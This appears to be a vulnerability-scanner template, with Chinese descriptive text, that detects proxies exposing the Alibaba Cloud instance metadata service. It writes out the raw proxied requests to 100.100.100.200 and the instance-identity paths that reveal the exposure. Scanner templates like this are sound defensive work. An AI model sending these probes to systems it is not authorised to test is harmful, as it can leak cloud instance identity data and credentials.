id: metadata-service-alibaba

# This attack abuses a misconfigured proxy that allows access to the metadata
# IP or a name which resolves to the IP. A standard proxy request is made to
# the proxy using the full metadata URL, which the proxy will fulfill to its
# own metadata service.
#
# The proxy may also be vulnerable to host/port enumeration on localhost or
# inside the private network.
info:
  name: Alibaba Cloud 元数据服务代理暴露
  author: sullo,pwnhxl
  severity: critical
  description: |
    该模板用于核查 Alibaba Cloud 元数据服务代理暴露。该类问题通常源于开放代理或 SSRF 通道可访问云厂商元数据服务，导致实例身份和启动配置被读取。模板会向目标发送探测请求，并依据匹配 `latest/dynamic/instance-identity/document`、匹配 `2016-01-01/dynamic/instance-identity/document`、匹配 `"serial-number"`等证据确认目标是否存在该配置问题。
  impact: |
    - 攻击者可能读取实例元数据、临时凭据、用户数据、网络配置或服务账号令牌。
    - 泄露的云凭据可能被用于访问云资源、横向移动或提升云环境权限。
  remediation: |
    - 阻断代理访问云元数据地址和链路本地地址，关闭不必要的外部代理能力。
    - 启用云厂商元数据服务的防护机制，例如 IMDSv2、Hop Limit、服务账号最小权限等。
    - 轮换可能泄露的临时凭据和密钥，并审计云 API 调用日志。
  reference:
    - https://www.alibabacloud.com/help/doc-detail/108460.htm
    - https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/
    - https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N
    cvss-score: 9.3
    cwe-id: CWE-441
  metadata:
    max-request: 4
  tags: exposure,config,alibaba,proxy,misconfig,metadata,vuln

http:
  - raw:
      - |+
        GET http://{{hostval}}/{{path}} HTTP/1.1
        Host: {{hostval}}

    payloads:
      hostval:
        - alibaba.oast.pro
        - 100.100.100.200
      path:
        - latest/dynamic/instance-identity/document
        - 2016-01-01/dynamic/instance-identity/document
    attack: clusterbomb

    unsafe: true
    matchers:
      - type: word
        part: body
        words:
          - '"serial-number"'
          - '"zone-id":"'
        condition: and
